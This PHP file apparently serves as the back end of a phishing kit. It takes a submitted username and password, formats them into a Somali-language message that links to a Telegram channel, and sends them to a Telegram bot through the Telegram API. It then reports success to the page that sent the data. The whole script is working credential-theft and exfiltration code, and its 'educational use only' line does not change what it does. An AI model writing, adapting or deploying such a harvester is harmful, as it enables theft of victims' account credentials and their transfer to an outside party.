<?php
header('Content-Type: application/json');
require 'bot.php';

$data = json_decode(file_get_contents('php://input'), true);
$username = $data['username'];
$password = $data['password'];

$message = "🌟 *Shabaqa Waa Lagu Doo Dhacay* 🌟\n\n";
$message .= "🔹 *Usernameka*: `$username`\n";
$message .= "🔹 *Passwordga*: `$password`\n\n";
$message .= "🔗 Xagan riix [here](https://t.me/anonyducoo) si aad noogu soo biirto \n \n ✅️ Kaliya U isticmaal qaab waxbarasho";

function sendTelegramMessage($message, $botToken, $chatId) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message) . "&parse_mode=Markdown";
    $response = file_get_contents($url);
    return $response;
}
$response = sendTelegramMessage($message, $botToken, $chatId);

echo json_encode(['success' => true]);
?>

